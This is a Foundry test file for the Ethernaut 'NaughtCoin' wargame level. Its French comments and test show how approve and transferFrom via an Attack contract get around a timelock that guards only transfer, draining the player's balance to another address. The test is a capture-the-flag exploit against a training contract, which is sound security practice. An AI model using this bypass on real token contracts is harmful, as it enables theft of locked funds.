// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin ng;
    Attack atck;
    address user = makeAddr("user");
    address alice = makeAddr("alice");

    function setUp() public {
        ng = new NaughtCoin(user);
        atck = new Attack(address(ng));
    }

    //La faille ici est que le modifier lockTokens a un else
    //et je peux d'abord utiliser la fonction approve pour permettre à une autre adresse
    //de depenser les tokens au nom du player.
    //C'est que je fais avec le contract Attack qui ou j'utilise la fonction transferFrom
    //pour permettre à ce que à partir d'une des instances du contract Attack je permet qu'il
    //depense les fonds en mon nom puis il utilise la fonction transferFrom pour s'envoyer lui
    //même les fonds puis les transférer sur un autre compte
    function testNaughtyTransferUserBalance() public {
        assertEq(ng.balanceOf(user), ng.INITIAL_SUPPLY());
        vm.startPrank(user);
        ng.approve(address(atck), ng.balanceOf(user));
        vm.stopPrank();
        vm.prank(user);
        atck.attack(user, ng.INITIAL_SUPPLY());
        assertEq(ng.balanceOf(address(atck)), ng.INITIAL_SUPPLY());
        assertEq(ng.balanceOf(user), 0);
        atck.withdraw(alice);
        assertEq(ng.balanceOf(alice), ng.INITIAL_SUPPLY());
        assertEq(ng.balanceOf(address(atck)), 0);
    }
}
